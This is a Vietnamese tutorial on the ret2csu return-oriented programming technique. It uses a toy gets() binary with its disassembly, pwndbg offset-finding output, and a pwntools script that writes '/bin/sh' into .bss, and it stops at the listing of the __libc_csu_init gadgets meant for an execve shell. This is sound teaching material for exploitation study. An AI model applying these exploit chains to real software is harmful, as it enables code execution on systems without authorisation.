# Ret2csu
## Introduction
kỹ thuật ret2csu này liên quan đến việc tận dụng 1 gadgets luôn có sẵn trong các file binary là `__libc_csu_init` để bù vào những chỗ  trống cho các gadgets thường dùng trong ROP không có trong file binary. Ví dụ, nếu ta cần thực hiện `execve` syscall, chúng ta cần truyền vào các thanh ghi với các giá trị sau:
-   rdi = địa chỉ trỏ vào chuỗi `/bin/sh`
-   rdx = 0
-   rsi = 0

trong lúc này chúng ta đang tìm các gadget có trong binary, ta sẽ không thể tìm thấy 1 gadget như `pop rdx;ret`. Vì vậy, ret2csu được sinh ra nhờ tận dụng các gadget có trong `_libc_csu_init`, để craft thành 1 payload hoàn chỉnh.
## __libc_csu_init and __libc_csu_fini - Program level ctor/dtor handlers
Mục đích của `__libc_csu_init` là dùng để initialize function và variables để binary có thể dùng. từ source của glibc:
```c
int __libc_csu_init(int argc, char **argv, char **envp)
{
    /*
     * Call all the __attribute__((constructor)) functions.
     * These symbols are generated by the linker.
     */
    size_t num_init = __init_array_end - __init_array_start;
    for (size_t i = 0; i < num_init; i++) {
        __init_array_start[i](argc, argv, envp);
    }
}
```
Tóm lại, thì hàm này dùng để tính toán sự khác biệt giữa `__init_aray` lúc bắt đầu và kết thúc - cái mà bao gồm functions, constructors, destructors, objects... 

Nói đơn giản thì constructor sẽ thực hiện trước hàm `main()` và deconstructor sẽ thực hiện khi kết thúc hàm. Đọc giả có thể đọc sâu hơn về các hàm này ở references bên dưới.
### references 
> http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html

> https://phoxis.org/2011/04/27/c-language-constructors-and-destructors-with-gcc/

> https://oneraynyday.github.io/dev/2020/05/03/Analyzing-The-Simplest-C++-Program/

> http://bottomupcs.sourceforge.net/csbu/x3564.htm

## Practice

source code:
```c
#include<stdio.h>
#include<stdlib.h>
int main(){
    char buf[30];
    gets(buf);
    return 0;
}
```
```py
00000000004004e7 <main>:
  4004e7:	55                   	push   rbp
  4004e8:	48 89 e5             	mov    rbp,rsp
  4004eb:	48 83 ec 20          	sub    rsp,0x20
  4004ef:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  4004f3:	48 89 c7             	mov    rdi,rax
  4004f6:	b8 00 00 00 00       	mov    eax,0x0
  4004fb:	e8 f0 fe ff ff       	call   4003f0 <gets@plt>
  400500:	b8 00 00 00 00       	mov    eax,0x0
  400505:	c9                   	leave  
  400506:	c3                   	ret    
  400507:	66 0f 1f 84 00 00 00 	nop    WORD PTR [rax+rax*1+0x0]
  40050e:	00 00 

0000000000400510 <__libc_csu_init>:
  400510:	41 57                	push   r15
  400512:	41 56                	push   r14
  400514:	49 89 d7             	mov    r15,rdx
  400517:	41 55                	push   r13
  400519:	41 54                	push   r12
  40051b:	4c 8d 25 ee 08 20 00 	lea    r12,[rip+0x2008ee]        # 600e10 <__frame_dummy_init_array_entry>
  400522:	55                   	push   rbp
  400523:	48 8d 2d ee 08 20 00 	lea    rbp,[rip+0x2008ee]        # 600e18 <__init_array_end>
  40052a:	53                   	push   rbx
  40052b:	41 89 fd             	mov    r13d,edi
  40052e:	49 89 f6             	mov    r14,rsi
  400531:	4c 29 e5             	sub    rbp,r12
  400534:	48 83 ec 08          	sub    rsp,0x8
  400538:	48 c1 fd 03          	sar    rbp,0x3
  40053c:	e8 87 fe ff ff       	call   4003c8 <_init>
  400541:	48 85 ed             	test   rbp,rbp
  400544:	74 20                	je     400566 <__libc_csu_init+0x56>
  400546:	31 db                	xor    ebx,ebx
  400548:	0f 1f 84 00 00 00 00 	nop    DWORD PTR [rax+rax*1+0x0]
  40054f:	00 
  400550:	4c 89 fa             	mov    rdx,r15
  400553:	4c 89 f6             	mov    rsi,r14
  400556:	44 89 ef             	mov    edi,r13d
  400559:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
  40055d:	48 83 c3 01          	add    rbx,0x1
  400561:	48 39 dd             	cmp    rbp,rbx
  400564:	75 ea                	jne    400550 <__libc_csu_init+0x40>
  400566:	48 83 c4 08          	add    rsp,0x8
  40056a:	5b                   	pop    rbx
  40056b:	5d                   	pop    rbp
  40056c:	41 5c                	pop    r12
  40056e:	41 5d                	pop    r13
  400570:	41 5e                	pop    r14
  400572:	41 5f                	pop    r15
  400574:	c3                   	ret    
  400575:	90                   	nop
  400576:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
  40057d:	00 00 00 
```
### finding offset:
```py
pwndbg> r < <(python -c "print 'a'*(0x2c + 4)")
Starting program: /home/tinnt/research/ret2csu/main < <(python -c "print 'a'*(0x2c + 4)")

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400506 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x7ffff7dcda00 (_IO_2_1_stdin_) ◂— 0xfbad2088
 RDX  0x7ffff7dcf8d0 (_IO_stdfile_0_lock) ◂— 0x0
 RDI  0x7fffffffdf61 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
 RSI  0x602261 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
 R8   0x602291 ◂— 0x0
 R9   0x0
 R10  0x602010 ◂— 0x0
 R11  0x246
 R12  0x400400 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffe060 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x6161616161616161 ('aaaaaaaa')
 RSP  0x7fffffffdf88 ◂— 'aaaaaaaa'
 RIP  0x400506 (main+31) ◂— ret    
───────────────────────────────────────────[ DISASM ]───────────────────────────────────────────
 ► 0x400506 <main+31>    ret    <0x6161616161616161>










───────────────────────────────────────────[ STACK ]────────────────────────────────────────────
00:0000│ rsp  0x7fffffffdf88 ◂— 'aaaaaaaa'
01:0008│      0x7fffffffdf90 ◂— 0x0
02:0010│      0x7fffffffdf98 —▸ 0x7fffffffe068 —▸ 0x7fffffffe39a ◂— '/home/tinnt/research/ret2csu/main'
03:0018│      0x7fffffffdfa0 ◂— 0x100008000
04:0020│      0x7fffffffdfa8 —▸ 0x4004e7 (main) ◂— push   rbp
05:0028│      0x7fffffffdfb0 ◂— 0x0
06:0030│      0x7fffffffdfb8 ◂— 0xac28dc81ff716da3
07:0038│      0x7fffffffdfc0 —▸ 0x400400 (_start) ◂— xor    ebp, ebp
─────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────
 ► f 0           400506 main+31
   f 1 6161616161616161
   f 2                0
────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```
### Lưu /bin/sh vào `.bss` segment
Vì chúng ta cần `execve("/bin/sh",0,0)`, nhưng mà vì chúng ta chưa có trong memory chứa địa chỉ của chuỗi này (thực chất là có, load được từ libc nhưng vì đây là kĩ thuật khác nên sẽ không dùng chuỗi được load sẵn từ libc), nên việc của ta làm lúc này là chọn 1 vùng nhớ writable (thường là .bss, .data) và write chuỗi `/bin/sh\x00` vào đó.

```py
from pwn import *

io = process('./main')
elf = ELF('./main')

payload = 'a'*0x28
# write /bin/sh to .bss, gets(buf)
payload += p64(0x0000000000400573)# pop rdi ; ret
# 0x601030, hex(elf.bss())
payload += p64(elf.bss()) # .bss
payload += p64(elf.plt['gets']) 

io.sendline(payload)

io.interactive()
```

chúng ta sẽ attach gdb vào trước khi send payload để debug:
`gdb.attach(io)`

```py
pwndbg: loaded 191 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ./main...(no debugging symbols found)...done.
Attaching to program: /home/tinnt/research/ret2csu/main, process 41501
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.27.so...done.
done.
Reading symbols from /lib64/ld-linux-x86-64.so.2...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/ld-2.27.so...done.
done.
0x00007f435febc151 in __GI___libc_read (fd=0, buf=0x1ca9260, nbytes=4096) at ../sysdeps/unix/sysv/linux/read.c:27
27	../sysdeps/unix/sysv/linux/read.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0xfffffffffffffe00
 RBX  0x7f4360197a00 (_IO_2_1_stdin_) ◂— 0xfbad2088
 RCX  0x7f435febc151 (read+17) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x1000
 RDI  0x0
 RSI  0x1ca9260 ◂— 0x0
 R8   0x77
 R9   0x0
 R10  0x1ca9010 ◂— 0x0
 R11  0x246
 R12  0x7f4360193760 (_IO_helper_jumps) ◂— 0x0
 R13  0x7f43601942a0 (_IO_file_jumps) ◂— 0x0
 R14  0x0
 R15  0x0
 RBP  0xd68
 RSP  0x7ffcc461fce8 —▸ 0x7f435fe39218 (_IO_file_underflow+296) ◂— test   rax, rax
 RIP  0x7f435febc151 (read+17) ◂— cmp    rax, -0x1000 /* 'H=' */
───────────────────────────────────────────[ DISASM ]───────────────────────────────────────────
 ► 0x7f435febc151 <read+17>     cmp    rax, -0x1000
   0x7f435febc157 <read+23>     ja     read+112 <read+112>
    ↓
   0x7f435febc1b0 <read+112>    mov    rdx, qword ptr [rip + 0x2dacb1]
   0x7f435febc1b7 <read+119>    neg    eax
   0x7f435febc1b9 <read+121>    mov    dword ptr fs:[rdx], eax
   0x7f435febc1bc <read+124>    mov    rax, -1
   0x7f435febc1c3 <read+131>    ret    
 
   0x7f435febc1c4 <read+132>    mov    rdx, qword ptr [rip + 0x2dac9d]
   0x7f435febc1cb <read+139>    neg    eax
   0x7f435febc1cd <read+141>    mov    dword ptr fs:[rdx], eax
   0x7f435febc1d0 <read+144>    mov    rax, -1
───────────────────────────────────────────[ STACK ]────────────────────────────────────────────
00:0000│ rsp  0x7ffcc461fce8 —▸ 0x7f435fe39218 (_IO_file_underflow+296) ◂— test   rax, rax
01:0008│      0x7ffcc461fcf0 —▸ 0x7f4360197a00 (_IO_2_1_stdin_) ◂— 0xfbad2088
02:0010│      0x7ffcc461fcf8 —▸ 0x7f43601942a0 (_IO_file_jumps) ◂— 0x0
03:0018│      0x7ffcc461fd00 —▸ 0x400400 (_start) ◂— xor    ebp, ebp
04:0020│      0x7ffcc461fd08 —▸ 0x7ffcc461fe60 ◂— 0x1
05:0028│      0x7ffcc461fd10 ◂— 0x0
06:0030│      0x7ffcc461fd18 —▸ 0x7f435fe3a4c2 (_IO_default_uflow+50) ◂— cmp    eax, -1
07:0038│      0x7ffcc461fd20 ◂— 9 /* '\t' */
─────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────
 ► f 0     7f435febc151 read+17
   f 1     7f435fe39218 _IO_file_underflow+296
   f 2     7f435fe3a4c2 _IO_default_uflow+50
   f 3     7f435fe2c2dd gets+333
   f 4           400500 main+25
   f 5     7f435fdcdbf7 __libc_start_main+231
────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
```

gửi `/bin/sh` ở interactive bash:
```bash
[*] Switching to interactive mode
$ /bin/sh
```
kiểm tra xem /bin/sh có write vào .bss hay không:
```py
pwndbg> x/s 0x601030
0x601030 <completed.7698>:      "/bin/sh"
```

### Ret2csu
Bây giờ chúng ta sẽ đi vào phần chính thức của chương trình bằng cách dùng các gadget của `__libc_csu_init`:
```asm
400550:	4c 89 fa             	mov    rdx,r15
  400553:	4c 89 f6             	mov    rsi,r14
  400556:	44 89 ef             	mov    edi,r13d
  400559:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
  40055d:	48 83 c3 01          	add    rbx,0x1
  400561:	48 39 dd             	cmp    rbp,rbx
  400564:	75 ea                	jne    400550 <__libc_csu_init+0x40>
  400566:	48 83 c4 08          	add    rsp,0x8
  40056a:	5b                   	pop    rbx
  40056b:	5d                   	pop    rbp
  40056c:	41 5c                	pop    r12
  40056e:	41 5d                	pop    r13
  400570:	41 5e                	pop    r14
  400572:	41 5f                	pop    r15
  400574:	c3                   	ret    
  400575:	90                   	nop
  400576:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
  40057d:	00 00 00 
```